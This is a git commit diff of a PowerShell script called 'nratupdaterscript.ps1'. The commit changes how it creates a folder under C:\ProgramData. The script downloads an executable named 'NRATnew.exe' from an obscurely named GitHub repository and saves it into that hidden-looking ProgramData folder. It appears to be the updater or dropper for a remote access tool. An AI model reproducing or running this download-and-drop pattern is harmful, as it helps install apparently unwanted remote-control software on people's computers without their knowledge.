4ab017e7478dc947cfec9611351a0742bac43c9c
ErrorLoadingUsername-404 <101419715+ErrorLoadingUsername-404@users.noreply.github.com>
2022-07-02 09:00:27 -0700

    Update nratupdaterscript.ps1

--- nratupdaterscript.ps1
+++ nratupdaterscript.ps1
@@ -1,6 +1,6 @@
 ﻿cd C:\ProgramData\zDATAxD
-md nratmyupdate
-cd nratmyupdate
+mkdir C:\ProgramData\zDATAxD\nratmyupdate
+cd C:\ProgramData\zDATAxD\nratmyupdate
 $source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/NRATnew.exe'
 $destination = 'C:\ProgramData\zDATAxD\nratmyupdate\NRATnew.exe'
 Invoke-WebRequest -Uri $source -OutFile $destination
